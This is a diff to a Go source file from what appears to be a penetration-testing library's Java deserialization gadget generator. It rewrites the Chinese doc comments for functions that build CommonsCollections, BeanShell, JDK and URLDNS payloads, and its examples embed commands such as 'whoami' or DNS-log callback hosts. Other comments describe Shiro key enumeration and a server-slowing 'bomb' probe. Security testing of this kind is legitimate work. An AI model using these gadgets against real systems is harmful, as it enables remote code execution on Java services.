@@ -107,6 +107,19 @@ type RuntimeExecGadget func(cmd string) (*JavaObject, error)
 //     Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
 //  6. Generate a Java object that implement by TemplateImpl.
 //     Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
+//
+// 参数:
+//   - name: gadget 名称，例如 "CommonsCollections1"
+//   - opts: 可变参数，可为类名/参数字符串、参数 map 或 GenClassOptionFun 配置项
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
+// Example:
+// ```
+// javaObject, err := yso.GetGadget("CommonsCollections1", "dnslog", "xxx.dnslog.cn")
+// ```
 func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
 	genClassOpt := []GenClassOptionFun{}
 	for _, opt := range opts {
@@ -352,8 +365,13 @@ func GenerateTemplateImplGadget(name string, opts ...GenClassOptionFun) (*JavaOb
 // 此函数使用ParseJavaSerialized方法来解析提供的字节序列，
 // 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，
 // 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。
-// byt：要解析的字节数组。
-// 返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - byt: 要解析的字节数组
+//
+// 返回值:
+//   - 解析出的第一个 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // raw := "rO0..." // base64 Java serialized object
@@ -374,8 +392,13 @@ func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
 
 // GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。
 // 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。
-// cmd：要传入Java对象的命令字符串。
-// 返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要传入Java对象的命令字符串
+//
+// 返回值:
+//   - 修改后的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -390,8 +413,13 @@ func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -406,8 +434,13 @@ func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -422,8 +455,13 @@ func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -438,8 +476,13 @@ func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -454,8 +497,13 @@ func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -470,8 +518,13 @@ func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
 
 // GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -486,8 +539,13 @@ func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
 
 // GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
 // 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要设置在Java对象中的命令字符串
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -503,8 +561,13 @@ func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
 // GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
 // 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数允许用户定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -524,8 +587,13 @@ func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -546,8 +614,13 @@ func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, 
 // 去除了对 commons-collections:3.1 的依赖。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -568,8 +641,13 @@ func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // 去除了对 commons-collections:3.1 的依赖。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -589,8 +667,13 @@ func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -610,8 +693,13 @@ func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject
 // GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -631,8 +719,13 @@ func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject
 // GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -652,8 +745,13 @@ func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject
 // GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -673,8 +771,13 @@ func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject
 // GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -694,8 +797,13 @@ func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -715,8 +823,13 @@ func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -736,8 +849,13 @@ func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject,
 // GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -757,8 +875,13 @@ func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -778,8 +901,13 @@ func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, err
 // GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -799,8 +927,13 @@ func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
 // 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 // 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置Java对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command = "whoami"
@@ -819,8 +952,13 @@ func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 
 // GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
 // 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
-// url：要在生成的Java对象中设置的URL字符串。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - url: 要在生成的Java对象中设置的URL字符串
+//
+// 返回值:
+//   - 构造好的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // url, token, _ = risk.NewDNSLogDomain()
@@ -844,8 +982,13 @@ func GetURLDNSJavaObject(url string) (*JavaObject, error) {
 
 // GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
 // 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
-// url：要在生成的Java对象中设置的URL字符串。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - url: 要在生成的Java对象中设置的URL字符串
+//
+// 返回值:
+//   - 构造好的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // url, token, _ = risk.NewDNSLogDomain()
@@ -872,7 +1015,11 @@ func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
 // GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
 // 使用预定义的FindClassByBomb序列化模板，然后在序列化对象中替换预设的ClassName占位符为提供的ClassName字符串。
 // className：要批判的目标服务器是否存在的Class Name值。
-// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
+//
+// 返回值:
+//   - 构造好的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
@@ -888,6 +1035,11 @@ func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 // GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
 // 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。
 // 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
+//
+// 返回值:
+//   - 生成的 Java 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
@@ -907,7 +1059,10 @@ func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 // 这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。
 // 对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；
 // 对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。
-// 返回：包含所有Gadget生成函数的接口切片。
+//
+// 返回值:
+//   - 包含所有 Gadget 生成函数的接口切片
+//
 // Example:
 // ```
 // allGadgets := yso.GetAllGadget()
@@ -949,6 +1104,10 @@ func GetAllGadget() []interface{} {
 }
 
 // GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
+//
+// 返回值:
+//   - 所有支持模板实现的 Gadget 生成函数切片
+//
 // Example:
 // ```
 //
@@ -986,6 +1145,10 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 }
 
 // GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
+//
+// 返回值:
+//   - 所有支持命令执行的 Gadget 生成函数切片
+//
 // Example:
 // ```
 //
